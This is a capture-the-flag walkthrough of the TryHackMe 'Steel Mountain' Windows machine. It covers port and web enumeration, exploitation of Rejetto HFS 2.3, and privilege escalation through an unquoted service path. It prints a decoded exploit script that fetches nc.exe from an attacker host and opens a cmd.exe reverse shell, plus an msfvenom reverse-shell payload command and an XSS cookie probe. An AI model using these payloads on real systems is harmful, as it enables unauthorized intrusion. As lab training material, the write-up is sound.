---
title: Steel Mountain
date: 2024-02-13 10:00
categories: [ctf, security, hacking, exploits]
tags: [ctf, security, hacking, exploits]
---

# Overview
Steel Mountain is a vulnerable machine from [TryHackMe](https://tryhackme.com) that requires some standard enumeration with setting up and running a couple of exploits. After you find the vulnerable services, the exploits and path to foothold and privilege escalation are straightforward. 

## Nmap Scan
* nmap -T4 -p- <target ip>
    * PORT      STATE SERVICE
    * 80/tcp    open  http
    * 135/tcp   open  msrpc
    * 139/tcp   open  netbios-ssn
    * 445/tcp   open  microsoft-ds
    * 3389/tcp  open  ms-wbt-server
    * 5985/tcp  open  wsman
    * 8080/tcp  open  http-proxy
    * 47001/tcp open  winrm
    * 49152/tcp open  unknown
    * 49153/tcp open  unknown
    * 49154/tcp open  unknown
    * 49155/tcp open  unknown
    * 49156/tcp open  unknown
    * 49169/tcp open  unknown
    * 49170/tcp open  unknown
* nmap -T4 -sV -A -p 135,139,445,3389,8080 <target ip>
    * 135/tcp  open  msrpc        Microsoft Windows RPC
    * 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
    * 445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    * 3389/tcp open  ssl          Microsoft SChannel TLS
    * 5985/tcp  filtered wsman
    * 47001/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    * |_http-server-header: Microsoft-HTTPAPI/2.0
    * 8080/tcp open http HttpFileServer httpd 2.3
[Rejetto HFS](http://www.rejetto.com/hfs/)

Most of the ports open aren't terrible helpful to use, the unknowns we can ignore here. The most interesting are typically the smb and http services. Checking out the smb services didn't get me anywhere at all, as there doesn't seem to be any access open over smb from what I could find. 

## Checking out the Site
We did find a login page on the site. There doesn't seem to be much we can do here without credentials:
* http://10.10.243.11:8080/~login

## Enumerating the Web Site
Nikto Scan
> nikto -h http://10.10.243.11:8080
    OSVDB-38019: /?mod=<script>alert(document.cookie)</script>&op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS).

Dirbuster
> dirbuster dir -u http://10.10.243.11:8080/ -w /usr/share/wordlists/dirb/common.txt 
    No interesting directories found on the site.

## Vulnerable Service
We do see this is Rejetto HttpFileServer 2.3 version. This has a vulnerability that exists both in `Metasploit` and a public python script. We can use searchsploit to find the public exploit: "searchsploit Rejetto 2.3"
* More than one file may come up in your search, and I actually found a different script by mistake at first: `49125.py`
* Took some attempts for me to figure out this is the wrong exploit, and instead the target public exploit is: `39161.py`
    * #EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).

Decoding some of the script, we can easily understand the intent: 
```java
{
ip_addr = "attacker ip" #local IP address
local_port = "listening port" # Local Port number

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://" ip_addr "/nc.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\nc.exe", 2 '//overwrite
end with

vbs2 = cscript.exe C:\Users\Public\script.vbs
vbs3 = "C:\Users\Public\nc.exe -e cmd.exe " ip_addr " " local_port
}
```
After URL Decoding the portions of the script that are encoded, we can see this script intends to utilize vbs script creation in order to reach back to our attacker machine, grab netcat, and then use netcat to reach back to our attacker IP and Port that is stagged on our end with netcat. 

> If we have our listener stagged properly on our attacker box with netcat, we will get a connection back to our attacker machine. 

> Success! We are on the machine as the user bill, and can grab user.txt. Now we need to enumerate the box to find our privilege escalation path. 

![User](https://github.com/Dathalind/dathalind.github.io/blob/main/assets/img/steel_mountain/steelmnuser.png?raw=true)

## Local Enumeration
After doing a file transfer with powershell, we let the x86 version of winpeas run to see what vulnerabilities exist, and take a look through to see what stands out the most. We want to find the low hanging fruit. 

* Basic enumeration items we find:
    * This is a Windows Sever 2012 R2 Data Center
    * Build number 9600
    * All Access to some Named Pipes, with one that has WriteData/Create File access
    * 3 users, Administrator, Guest, and Bill; Guest is disabled
    * There is a Public directory, and we have write/create file access there
    * No interesting files for us, we picked up our nc.exe and the hfs.exe files

Services that are non-microsoft, seems to be:
- Advanced System Care; AdvancedSystemCareService9.
- Amazon Agent.
- IEETwCollectorService.
- IObitUnSvr; no quotes and space detected.
- LiveUpdateSvc; no quotes and space detected.
- Can modify installed programs, seems to be related to those IOBit pua’s.

>Looks like we can write and create files inside of windows tasks and system32 tasks.
>> Found Bills password: PMBAf5KhZAxVhvqb
>>> Ntlmv2 hash was found, not super useful in this context as we aren't looking to pivot from this box.

At this point, the unquoted service path vulnerability seems to be the best choice to try. We need to craft a reverse shell payload to replace a process in one of the file path's are has a space, and that didn't have quotes around it. 

## Crafting our payload
Since `Advanced System Care` didn't have quotes, we throw a reverse shell into this file path as `Advanced.exe`. After we move the file into the path, we need to then stop and start the service that runs the files out of that path, which is service `AdvancedSystemCareService9`.

> Craft payload with `msfvenom`:
>> msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4545 -f exe > Advanced.exe

We transfer the payload over, put it in the correct path, and use sc start/stop to stop and start the service. Once this is done, we get our shell back, and are now `NT Authority\System`.

![Root](https://github.com/Dathalind/dathalind.github.io/blob/main/assets/img/steel_mountain/steelmnroot.png?raw=true)